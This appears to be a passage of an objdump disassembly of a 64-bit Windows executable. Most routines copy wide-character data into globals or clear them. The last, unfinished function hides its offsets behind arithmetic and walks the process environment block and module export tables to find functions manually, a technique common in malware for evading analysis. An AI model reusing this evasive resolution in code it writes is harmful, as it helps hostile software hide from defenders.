   14000945e:	cc                   	int3
   14000945f:	cc                   	int3
   140009460:	c6 05 81 a9 2b 00 01 	movb   $0x1,0x2ba981(%rip)        # 0x1402c3de8
   140009467:	0f b7 01             	movzwl (%rcx),%eax
   14000946a:	66 89 05 4f a9 2b 00 	mov    %ax,0x2ba94f(%rip)        # 0x1402c3dc0
   140009471:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   140009475:	66 89 05 46 a9 2b 00 	mov    %ax,0x2ba946(%rip)        # 0x1402c3dc2
   14000947c:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   140009480:	66 89 05 3d a9 2b 00 	mov    %ax,0x2ba93d(%rip)        # 0x1402c3dc4
   140009487:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   14000948b:	66 89 05 34 a9 2b 00 	mov    %ax,0x2ba934(%rip)        # 0x1402c3dc6
   140009492:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   140009496:	66 89 05 2b a9 2b 00 	mov    %ax,0x2ba92b(%rip)        # 0x1402c3dc8
   14000949d:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   1400094a1:	66 89 05 22 a9 2b 00 	mov    %ax,0x2ba922(%rip)        # 0x1402c3dca
   1400094a8:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   1400094ac:	66 89 05 19 a9 2b 00 	mov    %ax,0x2ba919(%rip)        # 0x1402c3dcc
   1400094b3:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   1400094b7:	66 89 05 10 a9 2b 00 	mov    %ax,0x2ba910(%rip)        # 0x1402c3dce
   1400094be:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   1400094c2:	66 89 05 07 a9 2b 00 	mov    %ax,0x2ba907(%rip)        # 0x1402c3dd0
   1400094c9:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   1400094cd:	66 89 05 fe a8 2b 00 	mov    %ax,0x2ba8fe(%rip)        # 0x1402c3dd2
   1400094d4:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   1400094d8:	66 89 05 f5 a8 2b 00 	mov    %ax,0x2ba8f5(%rip)        # 0x1402c3dd4
   1400094df:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   1400094e3:	66 89 05 ec a8 2b 00 	mov    %ax,0x2ba8ec(%rip)        # 0x1402c3dd6
   1400094ea:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   1400094ee:	66 89 05 e3 a8 2b 00 	mov    %ax,0x2ba8e3(%rip)        # 0x1402c3dd8
   1400094f5:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   1400094f9:	66 89 05 da a8 2b 00 	mov    %ax,0x2ba8da(%rip)        # 0x1402c3dda
   140009500:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   140009504:	66 89 05 d1 a8 2b 00 	mov    %ax,0x2ba8d1(%rip)        # 0x1402c3ddc
   14000950b:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   14000950f:	66 89 05 c8 a8 2b 00 	mov    %ax,0x2ba8c8(%rip)        # 0x1402c3dde
   140009516:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   14000951a:	66 89 05 bf a8 2b 00 	mov    %ax,0x2ba8bf(%rip)        # 0x1402c3de0
   140009521:	0f b7 41 22          	movzwl 0x22(%rcx),%eax
   140009525:	66 89 05 b6 a8 2b 00 	mov    %ax,0x2ba8b6(%rip)        # 0x1402c3de2
   14000952c:	0f b7 41 24          	movzwl 0x24(%rcx),%eax
   140009530:	66 89 05 ad a8 2b 00 	mov    %ax,0x2ba8ad(%rip)        # 0x1402c3de4
   140009537:	0f b7 41 26          	movzwl 0x26(%rcx),%eax
   14000953b:	66 89 05 a4 a8 2b 00 	mov    %ax,0x2ba8a4(%rip)        # 0x1402c3de6
   140009542:	c3                   	ret
   140009543:	cc                   	int3
   140009544:	cc                   	int3
   140009545:	cc                   	int3
   140009546:	cc                   	int3
   140009547:	cc                   	int3
   140009548:	cc                   	int3
   140009549:	cc                   	int3
   14000954a:	cc                   	int3
   14000954b:	cc                   	int3
   14000954c:	cc                   	int3
   14000954d:	cc                   	int3
   14000954e:	cc                   	int3
   14000954f:	cc                   	int3
   140009550:	0f 57 c0             	xorps  %xmm0,%xmm0
   140009553:	0f 29 05 76 a8 2b 00 	movaps %xmm0,0x2ba876(%rip)        # 0x1402c3dd0
   14000955a:	0f 29 05 5f a8 2b 00 	movaps %xmm0,0x2ba85f(%rip)        # 0x1402c3dc0
   140009561:	48 c7 05 74 a8 2b 00 	movq   $0x0,0x2ba874(%rip)        # 0x1402c3de0
   140009568:	00 00 00 00 
   14000956c:	c3                   	ret
   14000956d:	cc                   	int3
   14000956e:	cc                   	int3
   14000956f:	cc                   	int3
   140009570:	c6 05 b5 a8 2b 00 01 	movb   $0x1,0x2ba8b5(%rip)        # 0x1402c3e2c
   140009577:	0f b7 01             	movzwl (%rcx),%eax
   14000957a:	66 89 05 6f a8 2b 00 	mov    %ax,0x2ba86f(%rip)        # 0x1402c3df0
   140009581:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   140009585:	66 89 05 66 a8 2b 00 	mov    %ax,0x2ba866(%rip)        # 0x1402c3df2
   14000958c:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   140009590:	66 89 05 5d a8 2b 00 	mov    %ax,0x2ba85d(%rip)        # 0x1402c3df4
   140009597:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   14000959b:	66 89 05 54 a8 2b 00 	mov    %ax,0x2ba854(%rip)        # 0x1402c3df6
   1400095a2:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   1400095a6:	66 89 05 4b a8 2b 00 	mov    %ax,0x2ba84b(%rip)        # 0x1402c3df8
   1400095ad:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   1400095b1:	66 89 05 42 a8 2b 00 	mov    %ax,0x2ba842(%rip)        # 0x1402c3dfa
   1400095b8:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   1400095bc:	66 89 05 39 a8 2b 00 	mov    %ax,0x2ba839(%rip)        # 0x1402c3dfc
   1400095c3:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   1400095c7:	66 89 05 30 a8 2b 00 	mov    %ax,0x2ba830(%rip)        # 0x1402c3dfe
   1400095ce:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   1400095d2:	66 89 05 27 a8 2b 00 	mov    %ax,0x2ba827(%rip)        # 0x1402c3e00
   1400095d9:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   1400095dd:	66 89 05 1e a8 2b 00 	mov    %ax,0x2ba81e(%rip)        # 0x1402c3e02
   1400095e4:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   1400095e8:	66 89 05 15 a8 2b 00 	mov    %ax,0x2ba815(%rip)        # 0x1402c3e04
   1400095ef:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   1400095f3:	66 89 05 0c a8 2b 00 	mov    %ax,0x2ba80c(%rip)        # 0x1402c3e06
   1400095fa:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   1400095fe:	66 89 05 03 a8 2b 00 	mov    %ax,0x2ba803(%rip)        # 0x1402c3e08
   140009605:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   140009609:	66 89 05 fa a7 2b 00 	mov    %ax,0x2ba7fa(%rip)        # 0x1402c3e0a
   140009610:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   140009614:	66 89 05 f1 a7 2b 00 	mov    %ax,0x2ba7f1(%rip)        # 0x1402c3e0c
   14000961b:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   14000961f:	66 89 05 e8 a7 2b 00 	mov    %ax,0x2ba7e8(%rip)        # 0x1402c3e0e
   140009626:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   14000962a:	66 89 05 df a7 2b 00 	mov    %ax,0x2ba7df(%rip)        # 0x1402c3e10
   140009631:	0f b7 41 22          	movzwl 0x22(%rcx),%eax
   140009635:	66 89 05 d6 a7 2b 00 	mov    %ax,0x2ba7d6(%rip)        # 0x1402c3e12
   14000963c:	0f b7 41 24          	movzwl 0x24(%rcx),%eax
   140009640:	66 89 05 cd a7 2b 00 	mov    %ax,0x2ba7cd(%rip)        # 0x1402c3e14
   140009647:	0f b7 41 26          	movzwl 0x26(%rcx),%eax
   14000964b:	66 89 05 c4 a7 2b 00 	mov    %ax,0x2ba7c4(%rip)        # 0x1402c3e16
   140009652:	0f b7 41 28          	movzwl 0x28(%rcx),%eax
   140009656:	66 89 05 bb a7 2b 00 	mov    %ax,0x2ba7bb(%rip)        # 0x1402c3e18
   14000965d:	0f b7 41 2a          	movzwl 0x2a(%rcx),%eax
   140009661:	66 89 05 b2 a7 2b 00 	mov    %ax,0x2ba7b2(%rip)        # 0x1402c3e1a
   140009668:	0f b7 41 2c          	movzwl 0x2c(%rcx),%eax
   14000966c:	66 89 05 a9 a7 2b 00 	mov    %ax,0x2ba7a9(%rip)        # 0x1402c3e1c
   140009673:	0f b7 41 2e          	movzwl 0x2e(%rcx),%eax
   140009677:	66 89 05 a0 a7 2b 00 	mov    %ax,0x2ba7a0(%rip)        # 0x1402c3e1e
   14000967e:	0f b7 41 30          	movzwl 0x30(%rcx),%eax
   140009682:	66 89 05 97 a7 2b 00 	mov    %ax,0x2ba797(%rip)        # 0x1402c3e20
   140009689:	0f b7 41 32          	movzwl 0x32(%rcx),%eax
   14000968d:	66 89 05 8e a7 2b 00 	mov    %ax,0x2ba78e(%rip)        # 0x1402c3e22
   140009694:	0f b7 41 34          	movzwl 0x34(%rcx),%eax
   140009698:	66 89 05 85 a7 2b 00 	mov    %ax,0x2ba785(%rip)        # 0x1402c3e24
   14000969f:	0f b7 41 36          	movzwl 0x36(%rcx),%eax
   1400096a3:	66 89 05 7c a7 2b 00 	mov    %ax,0x2ba77c(%rip)        # 0x1402c3e26
   1400096aa:	0f b7 41 38          	movzwl 0x38(%rcx),%eax
   1400096ae:	66 89 05 73 a7 2b 00 	mov    %ax,0x2ba773(%rip)        # 0x1402c3e28
   1400096b5:	0f b7 41 3a          	movzwl 0x3a(%rcx),%eax
   1400096b9:	66 89 05 6a a7 2b 00 	mov    %ax,0x2ba76a(%rip)        # 0x1402c3e2a
   1400096c0:	c3                   	ret
   1400096c1:	cc                   	int3
   1400096c2:	cc                   	int3
   1400096c3:	cc                   	int3
   1400096c4:	cc                   	int3
   1400096c5:	cc                   	int3
   1400096c6:	cc                   	int3
   1400096c7:	cc                   	int3
   1400096c8:	cc                   	int3
   1400096c9:	cc                   	int3
   1400096ca:	cc                   	int3
   1400096cb:	cc                   	int3
   1400096cc:	cc                   	int3
   1400096cd:	cc                   	int3
   1400096ce:	cc                   	int3
   1400096cf:	cc                   	int3
   1400096d0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400096d3:	0f 11 05 42 a7 2b 00 	movups %xmm0,0x2ba742(%rip)        # 0x1402c3e1c
   1400096da:	0f 11 05 2f a7 2b 00 	movups %xmm0,0x2ba72f(%rip)        # 0x1402c3e10
   1400096e1:	0f 11 05 18 a7 2b 00 	movups %xmm0,0x2ba718(%rip)        # 0x1402c3e00
   1400096e8:	0f 11 05 01 a7 2b 00 	movups %xmm0,0x2ba701(%rip)        # 0x1402c3df0
   1400096ef:	c3                   	ret
   1400096f0:	c7 05 3e a7 2b 00 00 	movl   $0x0,0x2ba73e(%rip)        # 0x1402c3e38
   1400096f7:	00 00 00 
   1400096fa:	48 c7 05 2b a7 2b 00 	movq   $0x0,0x2ba72b(%rip)        # 0x1402c3e30
   140009701:	00 00 00 00 
   140009705:	c3                   	ret
   140009706:	cc                   	int3
   140009707:	cc                   	int3
   140009708:	cc                   	int3
   140009709:	cc                   	int3
   14000970a:	cc                   	int3
   14000970b:	cc                   	int3
   14000970c:	cc                   	int3
   14000970d:	cc                   	int3
   14000970e:	cc                   	int3
   14000970f:	cc                   	int3
   140009710:	c6 05 4d a7 2b 00 01 	movb   $0x1,0x2ba74d(%rip)        # 0x1402c3e64
   140009717:	0f b7 01             	movzwl (%rcx),%eax
   14000971a:	66 89 05 1f a7 2b 00 	mov    %ax,0x2ba71f(%rip)        # 0x1402c3e40
   140009721:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   140009725:	66 89 05 16 a7 2b 00 	mov    %ax,0x2ba716(%rip)        # 0x1402c3e42
   14000972c:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   140009730:	66 89 05 0d a7 2b 00 	mov    %ax,0x2ba70d(%rip)        # 0x1402c3e44
   140009737:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   14000973b:	66 89 05 04 a7 2b 00 	mov    %ax,0x2ba704(%rip)        # 0x1402c3e46
   140009742:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   140009746:	66 89 05 fb a6 2b 00 	mov    %ax,0x2ba6fb(%rip)        # 0x1402c3e48
   14000974d:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   140009751:	66 89 05 f2 a6 2b 00 	mov    %ax,0x2ba6f2(%rip)        # 0x1402c3e4a
   140009758:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   14000975c:	66 89 05 e9 a6 2b 00 	mov    %ax,0x2ba6e9(%rip)        # 0x1402c3e4c
   140009763:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   140009767:	66 89 05 e0 a6 2b 00 	mov    %ax,0x2ba6e0(%rip)        # 0x1402c3e4e
   14000976e:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   140009772:	66 89 05 d7 a6 2b 00 	mov    %ax,0x2ba6d7(%rip)        # 0x1402c3e50
   140009779:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   14000977d:	66 89 05 ce a6 2b 00 	mov    %ax,0x2ba6ce(%rip)        # 0x1402c3e52
   140009784:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   140009788:	66 89 05 c5 a6 2b 00 	mov    %ax,0x2ba6c5(%rip)        # 0x1402c3e54
   14000978f:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   140009793:	66 89 05 bc a6 2b 00 	mov    %ax,0x2ba6bc(%rip)        # 0x1402c3e56
   14000979a:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   14000979e:	66 89 05 b3 a6 2b 00 	mov    %ax,0x2ba6b3(%rip)        # 0x1402c3e58
   1400097a5:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   1400097a9:	66 89 05 aa a6 2b 00 	mov    %ax,0x2ba6aa(%rip)        # 0x1402c3e5a
   1400097b0:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   1400097b4:	66 89 05 a1 a6 2b 00 	mov    %ax,0x2ba6a1(%rip)        # 0x1402c3e5c
   1400097bb:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   1400097bf:	66 89 05 98 a6 2b 00 	mov    %ax,0x2ba698(%rip)        # 0x1402c3e5e
   1400097c6:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   1400097ca:	66 89 05 8f a6 2b 00 	mov    %ax,0x2ba68f(%rip)        # 0x1402c3e60
   1400097d1:	0f b7 41 22          	movzwl 0x22(%rcx),%eax
   1400097d5:	66 89 05 86 a6 2b 00 	mov    %ax,0x2ba686(%rip)        # 0x1402c3e62
   1400097dc:	c3                   	ret
   1400097dd:	cc                   	int3
   1400097de:	cc                   	int3
   1400097df:	cc                   	int3
   1400097e0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400097e3:	0f 29 05 66 a6 2b 00 	movaps %xmm0,0x2ba666(%rip)        # 0x1402c3e50
   1400097ea:	0f 29 05 4f a6 2b 00 	movaps %xmm0,0x2ba64f(%rip)        # 0x1402c3e40
   1400097f1:	c7 05 65 a6 2b 00 00 	movl   $0x0,0x2ba665(%rip)        # 0x1402c3e60
   1400097f8:	00 00 00 
   1400097fb:	c3                   	ret
   1400097fc:	cc                   	int3
   1400097fd:	cc                   	int3
   1400097fe:	cc                   	int3
   1400097ff:	cc                   	int3
   140009800:	0f 57 c0             	xorps  %xmm0,%xmm0
   140009803:	0f 29 05 66 a6 2b 00 	movaps %xmm0,0x2ba666(%rip)        # 0x1402c3e70
   14000980a:	48 c7 05 6b a6 2b 00 	movq   $0x0,0x2ba66b(%rip)        # 0x1402c3e80
   140009811:	00 00 00 00 
   140009815:	c3                   	ret
   140009816:	cc                   	int3
   140009817:	cc                   	int3
   140009818:	cc                   	int3
   140009819:	cc                   	int3
   14000981a:	cc                   	int3
   14000981b:	cc                   	int3
   14000981c:	cc                   	int3
   14000981d:	cc                   	int3
   14000981e:	cc                   	int3
   14000981f:	cc                   	int3
   140009820:	0f 57 c0             	xorps  %xmm0,%xmm0
   140009823:	0f 29 05 66 a6 2b 00 	movaps %xmm0,0x2ba666(%rip)        # 0x1402c3e90
   14000982a:	48 c7 05 6b a6 2b 00 	movq   $0x0,0x2ba66b(%rip)        # 0x1402c3ea0
   140009831:	00 00 00 00 
   140009835:	c3                   	ret
   140009836:	cc                   	int3
   140009837:	cc                   	int3
   140009838:	cc                   	int3
   140009839:	cc                   	int3
   14000983a:	cc                   	int3
   14000983b:	cc                   	int3
   14000983c:	cc                   	int3
   14000983d:	cc                   	int3
   14000983e:	cc                   	int3
   14000983f:	cc                   	int3
   140009840:	c6 05 af a6 2b 00 01 	movb   $0x1,0x2ba6af(%rip)        # 0x1402c3ef6
   140009847:	0f b7 01             	movzwl (%rcx),%eax
   14000984a:	66 89 05 5f a6 2b 00 	mov    %ax,0x2ba65f(%rip)        # 0x1402c3eb0
   140009851:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   140009855:	66 89 05 56 a6 2b 00 	mov    %ax,0x2ba656(%rip)        # 0x1402c3eb2
   14000985c:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   140009860:	66 89 05 4d a6 2b 00 	mov    %ax,0x2ba64d(%rip)        # 0x1402c3eb4
   140009867:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   14000986b:	66 89 05 44 a6 2b 00 	mov    %ax,0x2ba644(%rip)        # 0x1402c3eb6
   140009872:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   140009876:	66 89 05 3b a6 2b 00 	mov    %ax,0x2ba63b(%rip)        # 0x1402c3eb8
   14000987d:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   140009881:	66 89 05 32 a6 2b 00 	mov    %ax,0x2ba632(%rip)        # 0x1402c3eba
   140009888:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   14000988c:	66 89 05 29 a6 2b 00 	mov    %ax,0x2ba629(%rip)        # 0x1402c3ebc
   140009893:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   140009897:	66 89 05 20 a6 2b 00 	mov    %ax,0x2ba620(%rip)        # 0x1402c3ebe
   14000989e:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   1400098a2:	66 89 05 17 a6 2b 00 	mov    %ax,0x2ba617(%rip)        # 0x1402c3ec0
   1400098a9:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   1400098ad:	66 89 05 0e a6 2b 00 	mov    %ax,0x2ba60e(%rip)        # 0x1402c3ec2
   1400098b4:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   1400098b8:	66 89 05 05 a6 2b 00 	mov    %ax,0x2ba605(%rip)        # 0x1402c3ec4
   1400098bf:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   1400098c3:	66 89 05 fc a5 2b 00 	mov    %ax,0x2ba5fc(%rip)        # 0x1402c3ec6
   1400098ca:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   1400098ce:	66 89 05 f3 a5 2b 00 	mov    %ax,0x2ba5f3(%rip)        # 0x1402c3ec8
   1400098d5:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   1400098d9:	66 89 05 ea a5 2b 00 	mov    %ax,0x2ba5ea(%rip)        # 0x1402c3eca
   1400098e0:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   1400098e4:	66 89 05 e1 a5 2b 00 	mov    %ax,0x2ba5e1(%rip)        # 0x1402c3ecc
   1400098eb:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   1400098ef:	66 89 05 d8 a5 2b 00 	mov    %ax,0x2ba5d8(%rip)        # 0x1402c3ece
   1400098f6:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   1400098fa:	66 89 05 cf a5 2b 00 	mov    %ax,0x2ba5cf(%rip)        # 0x1402c3ed0
   140009901:	0f b7 41 22          	movzwl 0x22(%rcx),%eax
   140009905:	66 89 05 c6 a5 2b 00 	mov    %ax,0x2ba5c6(%rip)        # 0x1402c3ed2
   14000990c:	0f b7 41 24          	movzwl 0x24(%rcx),%eax
   140009910:	66 89 05 bd a5 2b 00 	mov    %ax,0x2ba5bd(%rip)        # 0x1402c3ed4
   140009917:	0f b7 41 26          	movzwl 0x26(%rcx),%eax
   14000991b:	66 89 05 b4 a5 2b 00 	mov    %ax,0x2ba5b4(%rip)        # 0x1402c3ed6
   140009922:	0f b7 41 28          	movzwl 0x28(%rcx),%eax
   140009926:	66 89 05 ab a5 2b 00 	mov    %ax,0x2ba5ab(%rip)        # 0x1402c3ed8
   14000992d:	0f b7 41 2a          	movzwl 0x2a(%rcx),%eax
   140009931:	66 89 05 a2 a5 2b 00 	mov    %ax,0x2ba5a2(%rip)        # 0x1402c3eda
   140009938:	0f b7 41 2c          	movzwl 0x2c(%rcx),%eax
   14000993c:	66 89 05 99 a5 2b 00 	mov    %ax,0x2ba599(%rip)        # 0x1402c3edc
   140009943:	0f b7 41 2e          	movzwl 0x2e(%rcx),%eax
   140009947:	66 89 05 90 a5 2b 00 	mov    %ax,0x2ba590(%rip)        # 0x1402c3ede
   14000994e:	0f b7 41 30          	movzwl 0x30(%rcx),%eax
   140009952:	66 89 05 87 a5 2b 00 	mov    %ax,0x2ba587(%rip)        # 0x1402c3ee0
   140009959:	0f b7 41 32          	movzwl 0x32(%rcx),%eax
   14000995d:	66 89 05 7e a5 2b 00 	mov    %ax,0x2ba57e(%rip)        # 0x1402c3ee2
   140009964:	0f b7 41 34          	movzwl 0x34(%rcx),%eax
   140009968:	66 89 05 75 a5 2b 00 	mov    %ax,0x2ba575(%rip)        # 0x1402c3ee4
   14000996f:	0f b7 41 36          	movzwl 0x36(%rcx),%eax
   140009973:	66 89 05 6c a5 2b 00 	mov    %ax,0x2ba56c(%rip)        # 0x1402c3ee6
   14000997a:	0f b7 41 38          	movzwl 0x38(%rcx),%eax
   14000997e:	66 89 05 63 a5 2b 00 	mov    %ax,0x2ba563(%rip)        # 0x1402c3ee8
   140009985:	0f b7 41 3a          	movzwl 0x3a(%rcx),%eax
   140009989:	66 89 05 5a a5 2b 00 	mov    %ax,0x2ba55a(%rip)        # 0x1402c3eea
   140009990:	0f b7 41 3c          	movzwl 0x3c(%rcx),%eax
   140009994:	66 89 05 51 a5 2b 00 	mov    %ax,0x2ba551(%rip)        # 0x1402c3eec
   14000999b:	0f b7 41 3e          	movzwl 0x3e(%rcx),%eax
   14000999f:	66 89 05 48 a5 2b 00 	mov    %ax,0x2ba548(%rip)        # 0x1402c3eee
   1400099a6:	0f b7 41 40          	movzwl 0x40(%rcx),%eax
   1400099aa:	66 89 05 3f a5 2b 00 	mov    %ax,0x2ba53f(%rip)        # 0x1402c3ef0
   1400099b1:	0f b7 41 42          	movzwl 0x42(%rcx),%eax
   1400099b5:	66 89 05 36 a5 2b 00 	mov    %ax,0x2ba536(%rip)        # 0x1402c3ef2
   1400099bc:	0f b7 41 44          	movzwl 0x44(%rcx),%eax
   1400099c0:	66 89 05 2d a5 2b 00 	mov    %ax,0x2ba52d(%rip)        # 0x1402c3ef4
   1400099c7:	c3                   	ret
   1400099c8:	cc                   	int3
   1400099c9:	cc                   	int3
   1400099ca:	cc                   	int3
   1400099cb:	cc                   	int3
   1400099cc:	cc                   	int3
   1400099cd:	cc                   	int3
   1400099ce:	cc                   	int3
   1400099cf:	cc                   	int3
   1400099d0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400099d3:	0f 29 05 06 a5 2b 00 	movaps %xmm0,0x2ba506(%rip)        # 0x1402c3ee0
   1400099da:	0f 29 05 ef a4 2b 00 	movaps %xmm0,0x2ba4ef(%rip)        # 0x1402c3ed0
   1400099e1:	0f 29 05 d8 a4 2b 00 	movaps %xmm0,0x2ba4d8(%rip)        # 0x1402c3ec0
   1400099e8:	0f 29 05 c1 a4 2b 00 	movaps %xmm0,0x2ba4c1(%rip)        # 0x1402c3eb0
   1400099ef:	48 c7 05 f4 a4 2b 00 	movq   $0x0,0x2ba4f4(%rip)        # 0x1402c3eee
   1400099f6:	00 00 00 00 
   1400099fa:	c3                   	ret
   1400099fb:	cc                   	int3
   1400099fc:	cc                   	int3
   1400099fd:	cc                   	int3
   1400099fe:	cc                   	int3
   1400099ff:	cc                   	int3
   140009a00:	0f 57 c0             	xorps  %xmm0,%xmm0
   140009a03:	0f 29 05 f6 a4 2b 00 	movaps %xmm0,0x2ba4f6(%rip)        # 0x1402c3f00
   140009a0a:	48 c7 05 f9 a4 2b 00 	movq   $0x0,0x2ba4f9(%rip)        # 0x1402c3f0e
   140009a11:	00 00 00 00 
   140009a15:	c3                   	ret
   140009a16:	cc                   	int3
   140009a17:	cc                   	int3
   140009a18:	cc                   	int3
   140009a19:	cc                   	int3
   140009a1a:	cc                   	int3
   140009a1b:	cc                   	int3
   140009a1c:	cc                   	int3
   140009a1d:	cc                   	int3
   140009a1e:	cc                   	int3
   140009a1f:	cc                   	int3
   140009a20:	48 8d 0d f1 a4 2b 00 	lea    0x2ba4f1(%rip),%rcx        # 0x1402c3f18
   140009a27:	41 b8 fc 04 00 00    	mov    $0x4fc,%r8d
   140009a2d:	31 d2                	xor    %edx,%edx
   140009a2f:	e9 2c 06 00 00       	jmp    0x14000a060
   140009a34:	cc                   	int3
   140009a35:	cc                   	int3
   140009a36:	cc                   	int3
   140009a37:	cc                   	int3
   140009a38:	cc                   	int3
   140009a39:	cc                   	int3
   140009a3a:	cc                   	int3
   140009a3b:	cc                   	int3
   140009a3c:	cc                   	int3
   140009a3d:	cc                   	int3
   140009a3e:	cc                   	int3
   140009a3f:	cc                   	int3
   140009a40:	8d 81 6e 25 4c f2    	lea    -0xdb3da92(%rcx),%eax
   140009a46:	c3                   	ret
   140009a47:	cc                   	int3
   140009a48:	cc                   	int3
   140009a49:	cc                   	int3
   140009a4a:	cc                   	int3
   140009a4b:	cc                   	int3
   140009a4c:	cc                   	int3
   140009a4d:	cc                   	int3
   140009a4e:	cc                   	int3
   140009a4f:	cc                   	int3
   140009a50:	41 57                	push   %r15
   140009a52:	41 56                	push   %r14
   140009a54:	41 55                	push   %r13
   140009a56:	41 54                	push   %r12
   140009a58:	56                   	push   %rsi
   140009a59:	57                   	push   %rdi
   140009a5a:	55                   	push   %rbp
   140009a5b:	53                   	push   %rbx
   140009a5c:	48 83 ec 38          	sub    $0x38,%rsp
   140009a60:	89 ce                	mov    %ecx,%esi
   140009a62:	44 8b 2d ef 97 2b 00 	mov    0x2b97ef(%rip),%r13d        # 0x1402c3258
   140009a69:	45 85 ed             	test   %r13d,%r13d
   140009a6c:	74 2d                	je     0x140009a9b
   140009a6e:	48 8b 1d eb 97 2b 00 	mov    0x2b97eb(%rip),%rbx        # 0x1402c3260
   140009a75:	44 89 e8             	mov    %r13d,%eax
   140009a78:	31 ff                	xor    %edi,%edi
   140009a7a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140009a80:	39 34 fb             	cmp    %esi,(%rbx,%rdi,8)
   140009a83:	0f 84 5d 02 00 00    	je     0x140009ce6
   140009a89:	48 ff c7             	inc    %rdi
   140009a8c:	48 39 f8             	cmp    %rdi,%rax
   140009a8f:	75 ef                	jne    0x140009a80
   140009a91:	bf ff ff ff ff       	mov    $0xffffffff,%edi
   140009a96:	e9 4b 02 00 00       	jmp    0x140009ce6
   140009a9b:	b9 f2 da b3 0d       	mov    $0xdb3daf2,%ecx
   140009aa0:	e8 9b ff ff ff       	call   0x140009a40
   140009aa5:	89 c0                	mov    %eax,%eax
   140009aa7:	65 48 8b 00          	mov    %gs:(%rax),%rax
   140009aab:	48 8b 40 18          	mov    0x18(%rax),%rax
   140009aaf:	48 8b 58 10          	mov    0x10(%rax),%rbx
   140009ab3:	4c 8b 6b 30          	mov    0x30(%rbx),%r13
   140009ab7:	bf ff ff ff ff       	mov    $0xffffffff,%edi
   140009abc:	4d 85 ed             	test   %r13,%r13
   140009abf:	0f 84 21 02 00 00    	je     0x140009ce6
   140009ac5:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140009ac9:	b9 ce da b3 0d       	mov    $0xdb3dace,%ecx
   140009ace:	e8 6d ff ff ff       	call   0x140009a40
   140009ad3:	41 89 c6             	mov    %eax,%r14d
   140009ad6:	45 31 e4             	xor    %r12d,%r12d
   140009ad9:	eb 14                	jmp    0x140009aef
   140009adb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140009ae0:	4d 89 ec             	mov    %r13,%r12
   140009ae3:	48 8b 1b             	mov    (%rbx),%rbx
   140009ae6:	4c 8b 6b 30          	mov    0x30(%rbx),%r13
   140009aea:	4d 85 ed             	test   %r13,%r13
   140009aed:	74 56                	je     0x140009b45
   140009aef:	4d 89 ef             	mov    %r13,%r15
   140009af2:	43 8b 04 2e          	mov    (%r14,%r13,1),%eax
   140009af6:	46 8b ac 28 88 00 00 	mov    0x88(%rax,%r13,1),%r13d
   140009afd:	00 
   140009afe:	4d 85 ed             	test   %r13,%r13
   140009b01:	74 e0                	je     0x140009ae3
   140009b03:	43 8b 6c 3d 0c       	mov    0xc(%r13,%r15,1),%ebp
